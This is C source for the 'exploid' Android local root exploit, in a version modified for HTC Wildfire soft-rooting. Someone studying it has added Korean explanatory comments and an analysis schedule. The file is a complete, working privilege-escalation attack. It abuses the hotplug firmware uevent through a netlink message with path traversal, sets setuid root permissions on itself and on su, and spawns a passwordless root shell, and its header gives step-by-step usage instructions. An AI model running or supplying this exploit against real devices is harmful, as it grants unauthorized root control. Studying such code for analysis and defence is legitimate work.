
/* android 1.x/2.x the real youdev feat. init local root exploit.
 *
 *
 * Modifications to original exploit for HTC Wildfire Stage 1 soft-root (c) 2010 Martin Paul Eve
 * Changes: 
 * -- Will not remount /system rw (NAND protection renders this pointless)
 * -- Doesn't copy self, merely chmods permissions of original executable
 * -- No password required for rootshell (designed to be immediately removed once su binary is in place)
 * 
 * Revised usage instructions:
 * -- Copy to /sqlite_stmt_journals/exploid and /sqlite_stmt_journals/su
 * -- chmod exploid to 755
 * -- Execute the binary
 * -- Enable or disable a hotplug item (wifi, bluetooth etc. -- this could be done automatically by an app that packaged this exploit) -- don't worry that it segfaults
 * -- Execute it again to gain rootshell
 * -- Copy to device (/sqlite_stmt_journals/) + chown/chmod su to 04711
 * -- Delete original exploid
 * -- Use modified Superuser app with misplaced su binary
 *
 * Explanatory notes:
 * -- This is designed to be used with a modified superuser app (not yet written) which will use the su binary in /sqlite_stmt_journals/
 * -- It is important that you delete the original exploid binary because, otherwise, any application can gain root
 *
 * Original copyright/usage information
 *
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 *
 */

// 대강 분석했습니다.
// 틀린 부분이 여러 부분 있는거 같네요.
// 상세 부분 분석이 필요합니다.
// 내일: 2차 분석
// 모레: 3차 분석
// 저모레: 4차 분석 (세부 분석)
// 그모레: 보고서 작성 (리포팅)
// 5일 동안 분석해보고 나서 자료를 또 검색할지 결정할 익스플로잇 코드입니다.
// hotplug 취약점이라고 하죠.

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

void clear_hotplug()
{
	int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
	write(ofd, "", 1);
	close(ofd);
}

void rootshell(char **env)
{
	char pwd[128];
	char *sh[] = {"/system/bin/sh", 0};

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


// 엔트리 포인트: 메인 함수 기능.
int main(int argc, char **argv, char **env)
{
	char buf[512], path[512];
	int ofd;
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock;
	char *basedir = NULL, *logmessage;


        // android의 rtld(런타임 로더)의 LD_ 버그가 없는지 확인후 있을 시, rootshell()을 바로 킴.
	/* I hope there is no LD_ bug in androids rtld :) */
	if (geteuid() == 0 && getuid() != 0)
		rootshell(env);

        // /proc/self/exe(쉘 데이터)에서 path 변수로 경로를 읽음.
	if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
		die("[-] readlink");

        // 루트 유저(geteuid() == 0)이면
	if (geteuid() == 0) {
		clear_hotplug(); // 핫플러그를 클리어함.
			
		chown(path, 0, 0); // 공격 코드 경로를 0, 0으로 소유자를 루트로 변경.
		chmod(path, 04711); // 퍼미션을 4711로 설정.
		
		chown("/sqlite_stmt_journals/su", 0, 0); // sqlite_stmt_journals/su의 소유자를 0으로 설정
		chmod("/sqlite_stmt_journals/su", 06755); // 퍼미션을 6755로 설정.

		return 0; // 리턴.
	}

	printf("[*] Android local root exploid (C) The Android Exploid Crew\n");
	printf("[*] Modified by Martin Paul Eve for Wildfire Stage 1 soft-root\n");

	basedir = "/sqlite_stmt_journals"; // 루트가 아닐 때 basedir = /sqlite_stmt_journals.
	if (chdir(basedir) < 0) {
		basedir = "/data/local/tmp"; // basedir이 없을때 /data/local/tmp로 설정.
		if (chdir(basedir) < 0) // basedir로 경로 이동.
			basedir = strdup(getcwd(buf, sizeof(buf)));
	}
	printf("[+] Using basedir=%s, path=%s\n", basedir, path);
	printf("[+] opening NETLINK_KOBJECT_UEVENT socket\n");

        // NETLINK_KOBJECT_UEVENT 소켓을 생성.
	memset(&snl, 0, sizeof(snl));
	snl.nl_pid = 1;
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");

	close(creat("loading", 0666));
        // hotplug를 644 퍼미션으로 생성하고 path(공격 코드 경로)를 저장.
	if ((ofd = creat("hotplug", 0644)) < 0)
		die("[-] creat");
	if (write(ofd, path , strlen(path)) < 0)
		die("[-] write");

       	close(ofd);

        // /proc/sys/kernel/hotplug를 data 파일로 심볼릭링크 저장.
	symlink("/proc/sys/kernel/hotplug", "data");

        // buf에 ACTION=add 관련 hotplug 익스플로잇 트리거 요청 설정.
	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
	         "SUBSYSTEM=firmware%c"
	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
	printf("[+] sending add message ...\n");

        // 소켓으로 설정한 메시지 전송. (트리거!)
	if (sendmsg(sock, &msg, 0) < 0)
		die("[-] sendmsg");
	close(sock);
	printf("[*] Try to invoke hotplug now, clicking at the wireless\n"
	       "[*] settings, plugin USB key etc.\n"
	       "[*] You succeeded if you find /system/bin/rootshell.\n"
	       "[*] GUI might hang/restart meanwhile so be patient.\n");
	return 0;
}